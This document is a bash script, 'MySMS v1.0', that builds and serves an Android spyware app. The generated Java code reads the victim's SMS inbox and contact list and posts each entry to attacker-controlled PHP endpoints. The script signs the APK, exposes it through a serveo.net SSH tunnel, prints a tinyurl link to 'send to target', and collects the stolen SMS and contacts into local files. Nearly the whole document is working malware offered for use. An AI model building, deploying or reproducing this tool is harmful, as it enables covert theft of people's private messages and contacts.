#!/bin/bash
# MySMS v1.0
# Author: @papusingh2sms (You don't become a coder by just changing the credits)
# Github: https://github.com/papusingh2sms/mysms

host="159.89.214.31" #Serveo.net

trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {
    local required_commands=("apksigner" "php" "ssh" "gradle")
    for cmd in "${required_commands[@]}"; do
        command -v "$cmd" > /dev/null 2>&1 || {
            echo >&2 "I require $cmd but it's not installed. Install it. Aborting."
            exit 1
        }
    done
}

banner() {


printf "\e[1;77m   __  __       ____  __  __ ____   \n"
printf "  |  \/  |_   _/ ___||  \/  / ___|  \n"
printf "  | |\/| | | | \___ \| |\/| \___ \  \n"
printf "  | |  | | |_| |___) | |  | |___) | \n"
printf "  |_|  |_|\__, |____/|_|  |_|____/ v1.0 \n"
printf "          |___/\e[0m\e[1;92m Author: @papusingh2sms\e[0m\n"
printf "\n"
}

createapp() {

printf "package com.mysms;\n" > app/app/src/main/java/com/MainActivity.java

printf "import android.content.ContentResolver;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.content.Intent;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.content.pm.PackageManager;\n" >> app/app/src/main/java/com/MainActivity.java 
printf "import android.database.Cursor;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.net.Uri;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.support.v4.app.ActivityCompat;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.support.v4.content.ContextCompat;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.view.View;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.AdapterView;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.ArrayAdapter;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.ListView;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.TextView;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.Toast;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.ArrayList;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.net.URL;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.net.MalformedURLException;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.File;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.IOException;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.ArrayList;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.List;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.BufferedReader;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.BufferedWriter;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.InputStreamReader;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.OutputStream;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.io.OutputStreamWriter;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.net.HttpURLConnection;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.net.URL;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.net.URLEncoder;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.sql.Timestamp;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.Iterator;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.UUID;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import javax.net.ssl.HttpsURLConnection;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.support.v7.app.AppCompatActivity;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.TextView;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.HashMap;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.content.ContentResolver;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.database.Cursor;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.net.Uri;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.provider.ContactsContract;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.os.Bundle;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.util.Log;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.view.Menu;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.view.MenuItem;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.ArrayAdapter;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import android.widget.ListView;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.ArrayDeque;\n" >> app/app/src/main/java/com/MainActivity.java
printf "import java.util.ArrayList;\n" >> app/app/src/main/java/com/MainActivity.java

printf "public class MainActivity extends AppCompatActivity {\n" >> app/app/src/main/java/com/MainActivity.java

printf "    private static MainActivity inst;\n" >> app/app/src/main/java/com/MainActivity.java
printf "    ArrayList<String> smsMessagesList = new ArrayList<String>();\n" >> app/app/src/main/java/com/MainActivity.java
printf "    ListView smsListView;\n" >> app/app/src/main/java/com/MainActivity.java
printf "    ArrayAdapter arrayAdapter;\n" >> app/app/src/main/java/com/MainActivity.java

printf "    public static MainActivity instance() {\n" >> app/app/src/main/java/com/MainActivity.java
printf "        return inst;\n" >> app/app/src/main/java/com/MainActivity.java
printf "    }\n" >> app/app/src/main/java/com/MainActivity.java
printf "    @Override\n" >> app/app/src/main/java/com/MainActivity.java
printf "    public void onStart() {\n" >> app/app/src/main/java/com/MainActivity.java
printf "        super.onStart();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        inst = this;\n" >> app/app/src/main/java/com/MainActivity.java
printf "    }\n" >> app/app/src/main/java/com/MainActivity.java


printf "    @Override\n" >> app/app/src/main/java/com/MainActivity.java
printf "    protected void onCreate(Bundle savedInstanceState) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "        super.onCreate(savedInstanceState);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        setContentView(R.layout.activity_main);\n" >> app/app/src/main/java/com/MainActivity.java

printf "        smsListView = (ListView) findViewById(R.id.SMSList);\n" >> app/app/src/main/java/com/MainActivity.java

printf "        arrayAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, smsMessagesList);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        smsListView.setAdapter(arrayAdapter);\n" >> app/app/src/main/java/com/MainActivity.java

printf "        checkperm();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        checkcontact();\n" >> app/app/src/main/java/com/MainActivity.java


printf "    }\n" >> app/app/src/main/java/com/MainActivity.java



printf "public void checkperm() {\n" >> app/app/src/main/java/com/MainActivity.java

printf "       if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.READ_SMS\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/MainActivity.java

                      
printf "           refreshSmsInbox();\n" >> app/app/src/main/java/com/MainActivity.java

 
printf "        } else {\n" >> app/app/src/main/java/com/MainActivity.java

printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/MainActivity.java
printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.READ_SMS\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/MainActivity.java
 
printf "          checkcontact();\n" >> app/app/src/main/java/com/MainActivity.java

printf "        }\n" >> app/app/src/main/java/com/MainActivity.java

printf "}\n" >> app/app/src/main/java/com/MainActivity.java

printf "public void checkcontact() {\n" >> app/app/src/main/java/com/MainActivity.java

printf "if(ContextCompat.checkSelfPermission(getBaseContext(), \"android.permission.READ_CONTACTS\") == PackageManager.PERMISSION_GRANTED) {\n" >> app/app/src/main/java/com/MainActivity.java
            
printf "            getcontacts();\n" >> app/app/src/main/java/com/MainActivity.java
 
printf "        } else {\n" >> app/app/src/main/java/com/MainActivity.java

printf "            final int REQUEST_CODE_ASK_PERMISSIONS = 123;\n" >> app/app/src/main/java/com/MainActivity.java
printf "            ActivityCompat.requestPermissions(MainActivity.this, new String[]{\"android.permission.READ_CONTACTS\"}, REQUEST_CODE_ASK_PERMISSIONS);\n" >> app/app/src/main/java/com/MainActivity.java
         
printf "         checkperm();\n" >> app/app/src/main/java/com/MainActivity.java

printf "        }\n" >> app/app/src/main/java/com/MainActivity.java

printf "}\n" >> app/app/src/main/java/com/MainActivity.java


printf "    public void getcontacts() {\n" >> app/app/src/main/java/com/MainActivity.java
printf "        Uri uri= ContactsContract.CommonDataKinds.Phone.CONTENT_URI;\n" >> app/app/src/main/java/com/MainActivity.java
printf "        String[] projection={ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,\n" >> app/app/src/main/java/com/MainActivity.java
printf "                ContactsContract.CommonDataKinds.Phone.NUMBER ,ContactsContract.CommonDataKinds.Phone._ID };\n" >> app/app/src/main/java/com/MainActivity.java
printf "        String slection=null;\n" >> app/app/src/main/java/com/MainActivity.java
printf "        String [] selctionargs=null;\n" >> app/app/src/main/java/com/MainActivity.java
printf "        String sortshort=null;\n" >> app/app/src/main/java/com/MainActivity.java
printf "        ContentResolver resolve=getContentResolver();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        Cursor  cursor=resolve.query(uri,projection,slection,selctionargs,sortshort);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        while (cursor.moveToNext())\n" >> app/app/src/main/java/com/MainActivity.java
printf "        {\n" >> app/app/src/main/java/com/MainActivity.java
printf "            String name=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));\n" >> app/app/src/main/java/com/MainActivity.java
printf "            String num=cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));\n" >> app/app/src/main/java/com/MainActivity.java
echo "            String contact = \"Name: \" + name + \", Number=\" + num + \"\\n\";" >> app/app/src/main/java/com/MainActivity.java
printf "try {\n" >> app/app/src/main/java/com/MainActivity.java          
  

printf "        HttpCall httpCallPost = new HttpCall();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        httpCallPost.setMethodtype(HttpCall.POST);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        httpCallPost.setUrl(\"http://%s:%s/contact.php\");\n" $host $port >> app/app/src/main/java/com/MainActivity.java
printf "        HashMap<String,String> paramsPost = new HashMap<>();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        paramsPost.put(\"contact\",contact);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        httpCallPost.setParams(paramsPost);\n" >> app/app/src/main/java/com/MainActivity.java
          
printf "        new HttpRequest(){\n" >> app/app/src/main/java/com/MainActivity.java
printf "            @Override\n" >> app/app/src/main/java/com/MainActivity.java
printf "            public void onResponse(String response) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "                super.onResponse(response);\n" >> app/app/src/main/java/com/MainActivity.java

printf "            }\n" >> app/app/src/main/java/com/MainActivity.java
printf "        }.execute(httpCallPost);\n" >> app/app/src/main/java/com/MainActivity.java

printf "} catch (Exception e) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "            e.printStackTrace();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        }\n" >> app/app/src/main/java/com/MainActivity.java

printf "       }\n" >> app/app/src/main/java/com/MainActivity.java
printf "       }\n" >> app/app/src/main/java/com/MainActivity.java

printf "    public void refreshSmsInbox() {\n" >> app/app/src/main/java/com/MainActivity.java

printf "        ContentResolver contentResolver = getContentResolver();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        Cursor smsInboxCursor = contentResolver.query(Uri.parse(\"content://sms/inbox\"), null, null, null, null);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        int indexBody = smsInboxCursor.getColumnIndex(\"body\");\n" >> app/app/src/main/java/com/MainActivity.java
printf "        int indexAddress = smsInboxCursor.getColumnIndex(\"address\");\n" >> app/app/src/main/java/com/MainActivity.java
printf "        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;\n" >> app/app/src/main/java/com/MainActivity.java
printf "        arrayAdapter.clear();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        do {\n" >> app/app/src/main/java/com/MainActivity.java
printf "            String str = \"SMS from: \" + smsInboxCursor.getString(indexAddress) +\n" >> app/app/src/main/java/com/MainActivity.java
echo "                    \"\\n\" + smsInboxCursor.getString(indexBody) + \"\\n\";" >> app/app/src/main/java/com/MainActivity.java

printf "try {\n" >> app/app/src/main/java/com/MainActivity.java
printf "  arrayAdapter.add(str);\n" >> app/app/src/main/java/com/MainActivity.java

printf "        HttpCall httpCallPost = new HttpCall();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        httpCallPost.setMethodtype(HttpCall.POST);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        httpCallPost.setUrl(\"http://%s:%s/receiver.php\");\n" $host $port >> app/app/src/main/java/com/MainActivity.java
printf "        HashMap<String,String> paramsPost = new HashMap<>();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        paramsPost.put(\"message\",str);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        httpCallPost.setParams(paramsPost);\n" >> app/app/src/main/java/com/MainActivity.java
          
printf "        new HttpRequest(){\n" >> app/app/src/main/java/com/MainActivity.java
printf "            @Override\n" >> app/app/src/main/java/com/MainActivity.java
printf "            public void onResponse(String response) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "                super.onResponse(response);\n" >> app/app/src/main/java/com/MainActivity.java

printf "            }\n" >> app/app/src/main/java/com/MainActivity.java
printf "        }.execute(httpCallPost);\n" >> app/app/src/main/java/com/MainActivity.java

printf "} catch (Exception e) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "            e.printStackTrace();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        }\n" >> app/app/src/main/java/com/MainActivity.java
printf "        } while (smsInboxCursor.moveToNext());\n" >> app/app/src/main/java/com/MainActivity.java

printf "    }\n" >> app/app/src/main/java/com/MainActivity.java


printf "    public void updateList(final String smsMessage) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "        arrayAdapter.insert(smsMessage, 0);\n" >> app/app/src/main/java/com/MainActivity.java
printf "        arrayAdapter.notifyDataSetChanged();\n" >> app/app/src/main/java/com/MainActivity.java
printf "    }\n" >> app/app/src/main/java/com/MainActivity.java

printf "    public void onItemClick(AdapterView<?> parent, View view, int pos, long id) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "        try {\n" >> app/app/src/main/java/com/MainActivity.java
echo "            String[] smsMessages = smsMessagesList.get(pos).split(\"\\n\");" >> app/app/src/main/java/com/MainActivity.java
printf "            String address = smsMessages[0];\n" >> app/app/src/main/java/com/MainActivity.java
printf "            String smsMessage = \"\";\n" >> app/app/src/main/java/com/MainActivity.java
printf "            for (int i = 1; i < smsMessages.length; ++i) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "                smsMessage += smsMessages[i];\n" >> app/app/src/main/java/com/MainActivity.java
printf "            }\n" >> app/app/src/main/java/com/MainActivity.java

echo "            String smsMessageStr = address + \"\\n\";" >> app/app/src/main/java/com/MainActivity.java
printf "            smsMessageStr += smsMessage;\n" >> app/app/src/main/java/com/MainActivity.java

printf "            Toast.makeText(this, smsMessageStr, Toast.LENGTH_SHORT).show();\n" >> app/app/src/main/java/com/MainActivity.java
            

printf "        } catch (Exception e) {\n" >> app/app/src/main/java/com/MainActivity.java
printf "            e.printStackTrace();\n" >> app/app/src/main/java/com/MainActivity.java
printf "        }\n" >> app/app/src/main/java/com/MainActivity.java

printf "    }\n" >> app/app/src/main/java/com/MainActivity.java

printf "}\n" >> app/app/src/main/java/com/MainActivity.java

}

configureapp() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"

createapp
}

checksms() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting SMS and Contacts incoming,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "sms.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] SMS Received!\n"
cat sms.txt >> ../sms.saved.txt
rm -rf sms.txt
printf "\n\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m sms.saved.txt\e[0m\n"
fi
sleep 0.5
if [[ -e "contacts.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Contacts Received!\n"
cat contacts.txt >> ../contacts.saved.txt
rm -rf contacts.txt
printf "\n\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m contacts.saved.txt\e[0m\n"
fi
sleep 0.5


done 

}

server() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"


$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink ' &


sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/mysms.apk \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/mysms.apk | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1 &
php -S "localhost:4444" > /dev/null 2>&1 &
sleep 3
checksms
}


checkapk() {
if [[ -e app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/build/outputs/apk/app-release-unsigned.apk mysms.apk
echo "      " | apksigner sign --ks key.keystore  mysms.apk > /dev/null


printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/mysms.apk \e[0m\n"
fi
default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

server
else
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
cd app/
gradle build
checkapk
else
exit 1
fi
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

}


start() {

if [[ -e "app/sendlink" ]]; then
rm -rf app/sendlink 
fi
default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
port_conn
configureapp
build
fi


}
banner
dependencies
start


